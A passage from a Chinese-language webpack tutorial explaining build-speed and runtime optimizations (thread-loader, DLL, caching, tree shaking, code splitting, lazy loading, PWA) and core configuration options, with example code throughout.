[</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">   进程启动大概为600ms，进程通信也有开销</span></span><br><span class="line"><span class="comment">   只有工作消耗时间比较长，才需要多线程打包</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">&#x27;thread-loader&#x27;</span>,</span><br><span class="line">      options: &#123;</span><br><span class="line">        worker: <span class="number">2</span>, <span class="comment">// 2个进程</span></span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">      options: &#123;</span><br><span class="line">        presets: [</span><br><span class="line">          [</span><br><span class="line">            <span class="string">&#x27;@babel/preset-env&#x27;</span>,</span><br><span class="line">            &#123;</span><br><span class="line">              useBuiltIns: <span class="string">&#x27;usage&#x27;</span>,</span><br><span class="line">              corejs: &#123; <span class="attr">version</span>: <span class="number">3</span> &#125;,</span><br><span class="line">              targets: &#123;</span><br><span class="line">                chrome: <span class="string">&#x27;60&#x27;</span>,</span><br><span class="line">                ie: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">              &#125;,</span><br><span class="line">            &#125;,</span><br><span class="line">          ],</span><br><span class="line">        ],</span><br><span class="line">        <span class="comment">// 开启babel缓存；第二次构建，会读取之前的缓存</span></span><br><span class="line">        cacheDirectory: <span class="literal">true</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h4 id="externals：排除打包（优化打包构建速度）"><a href="#externals：排除打包（优化打包构建速度）" class="headerlink" title="externals：排除打包（优化打包构建速度）"></a>externals：排除打包（优化打包构建速度）</h4><p>externals：让某些库不打包（通过 cdn 引入）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">externals: &#123;</span><br><span class="line">  <span class="comment">// 拒绝jQuery被打包进来</span></span><br><span class="line">  jquery: <span class="string">&#x27;jQuery&#x27;</span>,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h4 id="dll：单独打包（优化打包构建速度）"><a href="#dll：单独打包（优化打包构建速度）" class="headerlink" title="dll：单独打包（优化打包构建速度）"></a>dll：单独打包（优化打包构建速度）</h4><ul><li>如果使用 cdn 引入，建议使用 externals</li><li>如果不使用 cdn 引入，推荐使用 dll</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i add-asset-html-webpack-plugin -D</span><br></pre></td></tr></table></figure><p>dll：让某些库单独打包，后直接引入到 build 中</p><ul><li>可以在 code split 分割出 node_modules 后再用 dll 更细的分割，优化代码运行的性能</li><li>使用 dll 技术，对某些库（第三方库：jquery、react、vue…）进行单独打包</li></ul><p>webpack.dll.js 配置：（将 jquery 单独打包）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; resolve &#125; = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;</span><br><span class="line">  entry: &#123;</span><br><span class="line">    <span class="comment">// 最终打包生成的[name]-&gt;jquery</span></span><br><span class="line">    jquery: [<span class="string">&#x27;jquery&#x27;</span>],</span><br><span class="line">  &#125;,</span><br><span class="line">  output: &#123;</span><br><span class="line">    filename: <span class="string">&#x27;[name].js&#x27;</span>,</span><br><span class="line">    path: resolve(__dirname, <span class="string">&#x27;dll&#x27;</span>),</span><br><span class="line">    <span class="comment">// 打包的库里面向外暴露出去的内容叫什么名字 jquery_c37977f51e5c1fd27a84</span></span><br><span class="line">    library: <span class="string">&#x27;[name]_[hash]&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  plugins: [</span><br><span class="line">    <span class="comment">// 打包生成一个mainfest.json-&gt;提供和jquery映射</span></span><br><span class="line">    <span class="keyword">new</span> webpack.DllPlugin(&#123;</span><br><span class="line">      <span class="comment">// 映射库的暴露的内容名称</span></span><br><span class="line">      name: <span class="string">&#x27;[name]_[hash]&#x27;</span>,</span><br><span class="line">      <span class="comment">// 输出文件路径</span></span><br><span class="line">      path: resolve(__dirname, <span class="string">&#x27;dll/mainfest.json&#x27;</span>),</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  mode: <span class="string">&#x27;production&#x27;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>webpack.config.js 配置：（告诉 webpack 不需要再打包 jquery，并将之前打包好的 jquery 跟其他打包好的 jquery 跟其他打包好的资源一同输出到 build 目录下）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">&#x27;webpack&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> AddAssetHtmlWebpackPlugin = <span class="built_in">require</span>(<span class="string">&#x27;add-asset-html-webpack-plugin&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plugins: [</span><br><span class="line">  <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">    template: <span class="string">&#x27;./src/index.html&#x27;</span>,</span><br><span class="line">  &#125;),</span><br><span class="line">  <span class="comment">// 告诉webpack哪些库不参与打包，同时使用时的名称也得变</span></span><br><span class="line">  <span class="keyword">new</span> webpack.DllReferencePlugin(&#123;</span><br><span class="line">    manifest: resolve(__dirname, <span class="string">&#x27;dll/manifest.json&#x27;</span>),</span><br><span class="line">  &#125;),</span><br><span class="line">  <span class="comment">// 将某个文件打包输出到build目录下，并在html中自动引入该资源</span></span><br><span class="line">  <span class="keyword">new</span> AddAssetHtmlWebpackPlugin(&#123;</span><br><span class="line">    filepath: resolve(__dirname, <span class="string">&#x27;dll/jquery.js&#x27;</span>),</span><br><span class="line">  &#125;),</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h4 id="缓存："><a href="#缓存：" class="headerlink" title="缓存："></a>缓存：</h4><ul><li>babel 缓存：第二次打包构建速度更快（<strong>优化打包构建速度</strong>）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/\.js$/</span>,</span><br><span class="line">  exclude: <span class="regexp">/node_modules/</span>,</span><br><span class="line">  loader: <span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">  options: &#123;</span><br><span class="line">    presets: [</span><br><span class="line">      [</span><br><span class="line">        <span class="string">&#x27;@babel/preset-env&#x27;</span>,</span><br><span class="line">        &#123;</span><br><span class="line">          useBuiltIns: <span class="string">&#x27;usage&#x27;</span>,</span><br><span class="line">          corejs: &#123; <span class="attr">version</span>: <span class="number">3</span> &#125;,</span><br><span class="line">          targets: &#123;</span><br><span class="line">            chrome: <span class="string">&#x27;60&#x27;</span>,</span><br><span class="line">            ie: <span class="string">&#x27;9&#x27;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;,</span><br><span class="line">      ],</span><br><span class="line">    ],</span><br><span class="line">    <span class="comment">// 开启babel缓存；第二次构建，会读取之前的缓存</span></span><br><span class="line">    cacheDirectory: <span class="literal">true</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><ul><li>文件资源缓存：上线代码运行缓存更好使用（<strong>优化代码运行性能</strong>）</li></ul><ol><li>hash：每次webpack构建时会生成一个唯一的hash值。不管文件是否有变化它都会变化</li><li>chunkhash：如果打包来源于同一个chunk，那么hash值就一样。如果在 js 中引入 css，js 和 css 就会绑定在一起</li><li>contenthash：根据文件的内容生成hash值。不同文件hash值一定不一样</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">hash</span></span><br><span class="line"><span class="comment">  问题：因为js和css同时使用一个hash值，如果重新打包，会导致所有缓存失效</span></span><br><span class="line"><span class="comment">chunkhash</span></span><br><span class="line"><span class="comment">  问题：js和css值还是一样的。因为css是在js中被引入的，所以同属于一个chunk</span></span><br><span class="line"><span class="comment">contenthash</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">output: &#123;</span><br><span class="line">  filename: <span class="string">&#x27;js/built.[contenthash:10].js&#x27;</span>,</span><br><span class="line">  path: resolve(__dirname, <span class="string">&#x27;build&#x27;</span>),</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h4 id="tree-shaking：树摇（优化代码运行性能）"><a href="#tree-shaking：树摇（优化代码运行性能）" class="headerlink" title="tree shaking：树摇（优化代码运行性能）"></a>tree shaking：树摇（优化代码运行性能）</h4><p>去除程序中没有使用的代码，从而使体积更小，请求速度快</p><p>前提：</p><ol><li>必须使用 ES6 模块化</li><li>开启 production 环境</li></ol><p>在 <code>package.json</code> 中配置</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 可能会把css @babel/polyfill 文件都干掉</span></span><br><span class="line">&quot;sideEffects&quot;: false</span><br><span class="line"><span class="comment">// 不会对css、less文件tree shaking</span></span><br><span class="line">&quot;sideEffects&quot;: [&quot;*.css&quot;, &quot;*.less&quot;]</span><br></pre></td></tr></table></figure><h4 id="code-split：代码分割（优化代码运行性能）"><a href="#code-split：代码分割（优化代码运行性能）" class="headerlink" title="code split：代码分割（优化代码运行性能）"></a>code split：代码分割（优化代码运行性能）</h4><p>代码分割：将打包输出的一个大的 bundle.js 文件拆分成多个小文件，这样可以并行加载多个文件，比加载一个文件更快</p><ol><li><p>多入口拆分</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">entry: &#123;</span><br><span class="line">  <span class="comment">// 多入口：有一个入口，最终输出就有一个bundle</span></span><br><span class="line">  main: <span class="string">&#x27;./src/js/index.js&#x27;</span>,</span><br><span class="line">  test: <span class="string">&#x27;./src/js/test.js&#x27;</span>,</span><br><span class="line">&#125;,</span><br><span class="line">output: &#123;</span><br><span class="line">  filename: <span class="string">&#x27;js/[name].[contenthash:10].js&#x27;</span>,</span><br><span class="line">  path: resolve(__dirname, <span class="string">&#x27;build&#x27;</span>),</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li><li><p>optimization：</p><ul><li>可以将 node_modules 中代码单独打包一个 chunk 最终输出</li><li>自动分析多入口 chunk 中，有没有公共的文件。如果有会打包成单独一个 chunk（比如两个模块中都引入了 jquery 会被打包成单独的文件）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">optimization: &#123;</span><br><span class="line">  splitChunks: &#123;</span><br><span class="line">    chunks: <span class="string">&#x27;all&#x27;</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li><li><p>import 动态导入语法</p><p>通过 js 代码，让某个文件被单独打包成一个 chunk</p><p>import 动态导入语法：能将某个文件单独打包</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>(<span class="comment">/* webpackChunkName: &#x27;test&#x27; */</span> <span class="string">&#x27;./utils&#x27;</span>)</span><br><span class="line">  .then(<span class="function"><span class="params">result</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;文件加载成功&#x27;</span>, result)</span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;文件加载失败&#x27;</span>)</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure></li></ol><h4 id="lazy-loading：懒加载（优化代码运行性能）"><a href="#lazy-loading：懒加载（优化代码运行性能）" class="headerlink" title="lazy loading：懒加载（优化代码运行性能）"></a>lazy loading：懒加载（优化代码运行性能）</h4><ol><li>懒加载：当文件需要使用时才加载</li><li>正常加载：并行加载（同一时间加载多个文件）</li><li>预加载 prefetch：会在使用之前，提前加载 js 文件。等其他资源加载完毕，浏览器空闲了，再加载资源</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;btn&#x27;</span>).onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">import</span>(<span class="comment">/* webpackChunkName: &#x27;test&#x27;, webpackPrefetch: true */</span> <span class="string">&#x27;./test&#x27;</span>).then(<span class="function">(<span class="params">&#123; mul &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(mul(<span class="number">4</span>, <span class="number">5</span>))</span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">import</span>(<span class="string">&#x27;./test&#x27;</span>).then(<span class="function">(<span class="params">&#123; mul &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(mul(<span class="number">2</span>, <span class="number">5</span>))</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="PWA：离线可访问技术（优化代码运行性能）"><a href="#PWA：离线可访问技术（优化代码运行性能）" class="headerlink" title="PWA：离线可访问技术（优化代码运行性能）"></a>PWA：离线可访问技术（优化代码运行性能）</h4><p>渐进式网络开发应用程序，使用 serviceworker 和 worker 技术</p><ul><li>优点：离线也能访问</li><li>缺点：兼容性差</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i workbox-webpack-plugin -D</span><br></pre></td></tr></table></figure><p>webpack.config.js 中配置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> workboxWebpackPlugin = <span class="built_in">require</span>(<span class="string">&#x27;workbox-webpack-plugin&#x27;</span>)</span><br><span class="line">plugins: [</span><br><span class="line">  <span class="keyword">new</span> workboxWebpackPlugin.GenerateSW(&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    1.帮助serviceworker快速启动</span></span><br><span class="line"><span class="comment">    2.删除旧的serviceworker</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    生成一个serviceworker配置文件</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    clientsClaim: <span class="literal">true</span>,</span><br><span class="line">    skipWaiting: <span class="literal">true</span>,</span><br><span class="line">  &#125;),</span><br><span class="line">],</span><br></pre></td></tr></table></figure><p>index.js 中还需要写一段代码来激活它的使用</p><ol><li><p>eslint 不认识 window、navigator 全局变量</p><p>解决：需要修改 package.json 中 eslintConfig 配置</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;eslintConfig&quot;: &#123;</span><br><span class="line">  &quot;env&quot;: &#123;</span><br><span class="line">    &quot;browser&quot;: true // 支持浏览器端全局变量</span><br><span class="line">  &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure></li><li><p>sw 代码必须运行在服务器上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm i serve -g</span><br><span class="line"><span class="comment"># 启动服务器，将build目录下所有资源作为静态资源暴露出去</span></span><br><span class="line">serve -s build</span><br></pre></td></tr></table></figure></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  注册serviceWorker 处理兼容性问题</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;serviceWorker&#x27;</span> <span class="keyword">in</span> navigator) &#123;</span><br><span class="line">  <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;load&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    navigator.serviceWorker</span><br><span class="line">      .register(<span class="string">&#x27;/service-worker.js&#x27;</span>)</span><br><span class="line">      .then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;sw注册成功&#x27;</span>)</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;sw注册失败&#x27;</span>)</span><br><span class="line">      &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Webpack-配置详情"><a href="#Webpack-配置详情" class="headerlink" title="Webpack 配置详情"></a>Webpack 配置详情</h2><h3 id="entry"><a href="#entry" class="headerlink" title="entry"></a>entry</h3><ol><li><p>string -&gt; <code>entry: &#39;./src/index.js&#39;</code> <strong>单入口</strong></p><p>打包形成一个 chunk。输出一个 bundle 文件，此时 chunk 的名称默认是 main</p></li><li><p>array -&gt; <code>entry: [&#39;./src/index.js&#39;, &#39;./src/add.js&#39;]</code> 多入口</p><p>所有入口文件最终只会形成一个 chunk。输出出去只有一个 bundle 文件</p><p>只有在 HMR 功能中让 html 热更新生效</p></li><li><p>object -&gt; <code>entry: &#123; index: &#39;./src/index.js&#39;, add: &#39;./src/add.js&#39; &#125;</code> <strong>多入口</strong></p><p>有几个入口文件就形成几个 chunk，输出几个 bundle 文件，此时 chunk 的名称是 key</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">entry: &#123;</span><br><span class="line">  <span class="comment">// 最终只会形成一个chunk, 输出出去只有一个bundle文件。</span></span><br><span class="line">  index: [<span class="string">&#x27;./src/index.js&#x27;</span>, <span class="string">&#x27;./src/count.js&#x27;</span>],</span><br><span class="line">  <span class="comment">// 形成一个chunk，输出一个bundle文件。</span></span><br><span class="line">  add: <span class="string">&#x27;./src/add.js&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="output"><a href="#output" class="headerlink" title="output"></a>output</h3><p>library 一般是作为暴露库去使用，通常是结合 dll，将某个库单独打包</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">output: &#123;</span><br><span class="line">  <span class="comment">// 文件名称（指定名称+目录）</span></span><br><span class="line">  filename: <span class="string">&#x27;js/[name].js&#x27;</span>,</span><br><span class="line">  <span class="comment">// 输出文件目录（将来所有资源输出的公共目录）</span></span><br><span class="line">  path: resolve(__dirname, <span class="string">&#x27;build&#x27;</span>),</span><br><span class="line">  <span class="comment">// 所有资源引入公共路径前缀</span></span><br><span class="line">  publicPath: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">  <span class="comment">// 非入口chunk的名称</span></span><br><span class="line">  chunkFilename: <span class="string">&#x27;js/[name]_chunk.js&#x27;</span>,</span><br><span class="line">  <span class="comment">// 整个库向外暴露的变量名</span></span><br><span class="line">  library: <span class="string">&#x27;[name]&#x27;</span>,</span><br><span class="line">  <span class="comment">// libraryTarget: &#x27;window&#x27;, // 变量名添加到哪个browser</span></span><br><span class="line">  <span class="comment">// libraryTarget: &#x27;global&#x27;, // 变量名添加到哪个node</span></span><br><span class="line">  <span class="comment">// libraryTarget: &#x27;commonjs&#x27;,</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="module"><a href="#module" class="headerlink" title="module"></a>module</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>: &#123;</span><br><span class="line">  rules: [</span><br><span class="line">    &#123;</span><br><span class="line">      test: <span class="regexp">/\.css$/</span>,</span><br><span class="line">      <span class="comment">// 多个loader用use</span></span><br><span class="line">      use: [<span class="string">&#x27;style-loader&#x27;</span>, <span class="string">&#x27;css-loader&#x27;</span>],</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      test: <span class="regexp">/\.js$/</span>,</span><br><span class="line">      <span class="comment">// 排除node_modules下的js文件</span></span><br><span class="line">      exclude: <span class="regexp">/node_modules/</span>,</span><br><span class="line">      <span class="comment">// 只检查src下的js文件</span></span><br><span class="line">      include: resolve(__dirname, <span class="string">&#x27;src&#x27;</span>),</span><br><span class="line">      <span class="comment">// 优先执行</span></span><br><span class="line">      enforce: <span class="string">&#x27;pre&#x27;</span>,</span><br><span class="line">      <span class="comment">// 延后执行</span></span><br><span class="line">      <span class="comment">// enforce: &#x27;post&#x27;,</span></span><br><span class="line">      <span class="comment">// 单个loader用loader</span></span><br><span class="line">      loader: <span class="string">&#x27;eslint-loader&#x27;</span>,</span><br><span class="line">      options: &#123;&#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// 以下配置只会生效一个</span></span><br><span class="line">      oneOf: [],</span><br><span class="line">    &#125;,</span><br><span class="line">  ],</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="resolve"><a href="#resolve" class="headerlink" title="resolve"></a>resolve</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 解析模块的规则</span></span><br><span class="line">resolve: &#123;</span><br><span class="line">  <span class="comment">// 配置解析模块的别名</span></span><br><span class="line">  alias: &#123;</span><br><span class="line">    $css: resolve(__dirname, <span class="string">&#x27;src/css&#x27;</span>),</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 配置省略文件路径的后缀名</span></span><br><span class="line">  extensions: [<span class="string">&#x27;.js&#x27;</span>, <span class="string">&#x27;.json&#x27;</span>, <span class="string">&#x27;.jsx&#x27;</span>],</span><br><span class="line">  <span class="comment">// 告诉webpack解析模块去找哪个目录</span></span><br><span class="line">  modules: [resolve(__dirname, <span class="string">&#x27;../node_modules&#x27;</span>), <span class="string">&#x27;node_modules&#x27;</span>],</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h3 id="dev-server"><a href="#dev-server" class="headerlink" title="dev server"></a>dev server</h3><p>正常浏览器和服务器之间有跨域，但是服务器之间没有跨域。代码通过代理服务器运行，所以浏览器和代理服务器之间没有跨域，浏览器把请求发送到代理服务器上，代理服务器再把接收到的响应给浏览器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">devServer: &#123;</span><br><span class="line">  <span class="comment">// 运行代码的目录</span></span><br><span class="line">  contentBase: resolve(__dirname, <span class="string">&#x27;build&#x27;</span>),</span><br><span class="line">  <span class="comment">// 监视contentBase目录下的所有文件，一旦文件变化就会reload</span></span><br><span class="line">  watchContentBase: <span class="literal">true</span>,</span><br><span class="line">  watchOptions: &#123;</span><br><span class="line">    <span class="comment">// 忽略文件</span></span><br><span class="line">    ignored: <span class="regexp">/node_modules/</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// 启动gzip压缩</span></span><br><span class="line">  compress: <span class="literal">true</span>,</span><br><span class="line">  <span class="comment">// 端口号</span></span><br><span class="line">  port: <span class="number">5000</span>,</span><br><span class="line">  <span class="comment">// 域名</span></span><br><span class="line">  host: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">  <span class="comment">// 自动打开浏览器</span></span><br><span class="line">  open: <span class="literal">true</span>,</span><br><span class="line">  <span class="comment">// 开启HMR功能</span></span><br><span class="line">  hot: <span class="literal">true</span>,</span><br><span class="line">  <span class="comment">// 不要显示启动服务器日志信息</span></span><br><span class="line">  clientLogLevel: <span class="string">&#x27;none&#x27;</span>,</span><br><span class="line">  <span class="comment">// 除了一些基本启动信息以外，其他内容都不要显示</span></span><br><span class="line">  quiet: <span class="literal">true</span>,</span><br><span class="line">  <span class="comment">// 如果出错了，不要全屏提示</span></span><br><span class="line">  overlay: <span class="literal">false</span>,</span><br><span class="line">  <span class="comment">// 服务器代理-&gt;解决开发环境跨域问题</span></span><br><span class="line">  proxy: &#123;</span><br><span class="line">    <span class="comment">// 一旦devServer(5000)服务器接收到了 /api/xxx 请求，就会把请求转发到另一个服务器(3000)</span></span><br><span class="line">    <span class="string">&#x27;/api&#x27;</span>: &#123;</span><br><span class="line">      target: <span class="string">&#x27;http://localhost:3000&#x27;</span>,</span><br><span class="line">      <span class="comment">// 发送请求时，请求路径重写：将 /api/xxx -&gt; /xxx</span></span><br><span class="line">      pathRewrite: 